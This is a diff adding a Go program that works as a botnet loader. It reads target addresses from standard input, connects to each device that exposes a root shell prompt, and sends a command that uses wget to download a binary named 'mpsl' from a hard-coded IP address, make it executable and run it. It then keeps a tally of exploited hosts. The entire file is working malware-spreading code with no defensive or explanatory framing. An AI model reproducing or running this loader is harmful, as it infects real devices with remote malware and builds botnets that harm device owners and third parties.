@@ -1,0 +1,97 @@
+package main
+
+import (
+	"fmt"
+	"net"
+	"os"
+	"strings"
+	"time"
+
+	"bufio"
+	"sync"
+)
+
+var (
+	port = os.Args[1]
+	wg   sync.WaitGroup
+
+	timeout = 120 * time.Second
+
+	processed uint64
+	found     uint64
+	exploited uint64
+
+	payload = "cd /tmp; cd /var/tmp; wget http://62.113.113.168/mpsl; chmod 777 mpsl; ./mpsl nuts"
+)
+
+func waitForPrompt(conn net.Conn, prompt string) bool {
+	reader := bufio.NewReader(conn)
+	for {
+		buff := make([]byte, 1024)
+		_, err := reader.Read(buff)
+		if err != nil {
+			return false
+		}
+		if strings.Contains(string(buff), prompt) {
+			return true
+		}
+	}
+	return false
+}
+
+func exploitDevice(target string) {
+	processed++
+	wg.Add(1)
+	defer wg.Done()
+
+	conn, err := net.DialTimeout("tcp", target, timeout)
+	if err != nil {
+		fmt.Println("Error connecting:", err)
+		return
+	}
+	defer conn.Close()
+
+	if !waitForPrompt(conn, "#") {
+		return
+	}
+
+	found++
+
+	conn.Write([]byte(payload + "\r\n"))
+	time.Sleep(5 * time.Second)
+
+	if !waitForPrompt(conn, "listening dn0") {
+		fmt.Println("exploited " + target)
+		exploited++
+	}
+}
+
+func titleWriter() {
+	for {
+		fmt.Printf("Processed: %d | Found: %d | Exploited: %d\n", processed, found, exploited)
+		time.Sleep(1 * time.Second)
+	}
+}
+
+func main() {
+	if len(os.Args) < 2 {
+		fmt.Printf("%s <port>\r\n", os.Args[0])
+		os.Exit(1)
+	}
+
+	scanner := bufio.NewScanner(os.Stdin)
+
+	go titleWriter()
+
+	for scanner.Scan() {
+		target := scanner.Text()
+		if port != "manual" {
+			target += ":" + port
+		}
+
+		go exploitDevice(target)
+	}
+
+	time.Sleep(10 * time.Second)
+	wg.Wait()
+}
